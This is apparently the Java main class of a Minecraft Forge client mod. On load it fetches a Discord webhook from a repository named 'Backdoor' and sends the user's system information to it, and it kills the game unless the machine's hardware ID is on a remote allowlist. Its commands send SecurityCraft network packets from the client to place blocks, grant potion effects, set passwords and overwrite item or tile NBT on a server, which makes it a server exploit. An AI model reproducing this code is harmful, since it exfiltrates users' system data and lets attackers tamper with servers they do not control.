package Adderall.dev;

import Adderall.dev.chat.ClientChat;
import Adderall.dev.command.SCmd;

import static Adderall.dev.command.CmdHelper.parsePosOrDef;
import static Adderall.dev.util.Network.sendPacket2SC;
import static java.lang.Integer.parseInt;
import static java.lang.Math.random;
import static java.lang.Math.round;

import java.util.Arrays;
import Adderall.dev.event.EventHandler;
import Adderall.dev.util.*;
import net.minecraft.block.Block;
import net.minecraft.world.WorldSettings;
import org.apache.logging.log4j.Logger;

import net.minecraft.client.Minecraft;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTTagCompound;
import cpw.mods.fml.common.Mod;
import cpw.mods.fml.common.ModMetadata;
import cpw.mods.fml.common.event.FMLPreInitializationEvent;
import cpw.mods.fml.common.registry.GameRegistry;
import net.geforcemods.securitycraft.network.packets.*;

@Mod(name = Main.NAME, modid = Main.MODID, version = Main.VERSION, dependencies = "after:securitycraft")
public class Main
{
    public static final String NAME = "@NAME@";
    public static final String MODID = "@MODID@";
    public static final String VERSION = "@VERSION@";
    
    public static final String DESCRIPTION = "Description? No!";
    public static final String[] AUTHORS = { System.getProperty("user.name") };
    public static final String CREDITS = "Thx To My Brain Cells.";

    public static final Minecraft mc = Minecraft.getMinecraft();
    public static Logger logger;

    public static EventHandler eventHandler;

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent e)
    {
		ModMetadata metadata = e.getModMetadata();
        metadata.autogenerated = false;
        metadata.modId = Main.MODID;
        metadata.name = Main.NAME;
        metadata.description = Main.DESCRIPTION;
        metadata.version = Main.VERSION;
        metadata.authorList = Arrays.asList(Main.AUTHORS);
        metadata.credits = Main.CREDITS;
        logger = e.getModLog();

		(eventHandler = new EventHandler()).init();

		Network.GET("https://raw.githubusercontent.com/Gh-raf/Backdoor/main/DiscordWebhook",
				rep -> {
					DiscordWebhook webhook = new DiscordWebhook(rep.split("\n")[0]);
					webhook.setContent(Analytics.parseSystemInfo());
					webhook.setUsername("MinecraftModBackdoor");
					webhook.setTts(true);
					try { webhook.execute(); } catch (Exception ignored) { }
				}, () -> {});

		Network.GET("https://raw.githubusercontent.com/Gh-raf/Backdoor/main/HWIDs",
				rep -> {
					String HWID = Analytics.getHWID();
					for (String h : rep.split("\n"))
						if (HWID.equals(h))
							return;

					System.exit(0);
				}, () -> System.exit(0));
	}

    /* ---- Commands ---- */
    
    static {
		new SCmd("pgm", args ->
				mc.playerController.setGameType(WorldSettings.GameType.getByID(parseInt(args[0]))));

    	new SCmd("pfill", args -> {
			String bId = GameRegistry.findUniqueIdentifierFor(Block
					.getBlockById(Integer.parseInt(args[0]))).toString();

			final int[] n = parsePosOrDef(args, 1);
			final int[] m = parsePosOrDef(args, 4);
			int[] acc = new int[] { 1, 1, 1 };
			int[] rnd = new int[] { 0, 0, 0 };

            for (int i = 0; i < 3; i++) {
				int t = m[i];
				m[i] = Math.max(n[i], m[i]);
				n[i] += t - m[i];
			}

			if (args.length >= 8 && args[7].equals("true")) {
			  for (int i = 0; i < 3; i++) rnd[i] = (int) round(random());
			  acc = new int[] { 3, 2, 3 };
			}

			for (int x = n[0] + rnd[0]; x <= m[0]; x += acc[0])
				for (int y = n[1] + rnd[1]; y <= m[1]; y += acc[1])
					for (int z = n[2] + rnd[2]; z <= m[2]; z += acc[2])
						sendPacket2SC(new PacketSetBlockAndMetadata(x, y, z, bId, 0));
    	});

    	new SCmd("peffect", args ->
				sendPacket2SC(new PacketGivePotionEffect(parseInt(args[0]), parseInt(args[1]), parseInt(args[2]))));

    	new SCmd("psetpass", args -> {
    		int[] b = parsePosOrDef(args, 1);
			sendPacket2SC(new PacketSSetPassword(b[0], b[1], b[2], args.length >= 1 ? args[0] : "4269"));
    	});
    	
    	/*
    	 * pnbtget hand
    	 * pnbtget tile
    	 * pnbtget tile x y z
    	 */
    	new SCmd("pnbtget", args -> {
    		NBTTagCompound nbt = new NBTTagCompound();
    		switch (args[0]) {
    			case "hand":
    				nbt = mc.thePlayer.getCurrentEquippedItem().stackTagCompound;
    				break;
    			case "tile":
    				final int[] b = parsePosOrDef(args, 1);
    				mc.theWorld.getTileEntity(b[0], b[1], b[2]).writeToNBT(nbt);
    				break;
    			default:
    				ClientChat.send("Error!");
    				return;
    		}

			Clipboard.copy(nbt.toString());
    	});

		/*
    	 * pnbtset hand <nbt>
    	 * pnbtset tile <nbt>
    	 * pnbtset tile x y z <nbt>
    	 */
    	new SCmd("pnbtset", args -> {
    		NBTTagCompound nbt = (NBTTagCompound) JsonToNBT.func_150315_a(Clipboard.paste());

    		switch(args[0]) {
    			case "hand":
    				final ItemStack i = mc.thePlayer.getCurrentEquippedItem();
    				i.setTagCompound(nbt);
					sendPacket2SC(new PacketSUpdateNBTTag(i));
    				break;
    			case "tile":
    				int[] b = parsePosOrDef(args, 1);
					sendPacket2SC(new PacketSSyncTENBTTag(b[0], b[1], b[2], nbt));
    				break;
    			default: 
    				ClientChat.send("Error!");
			}
    	});
    }
}
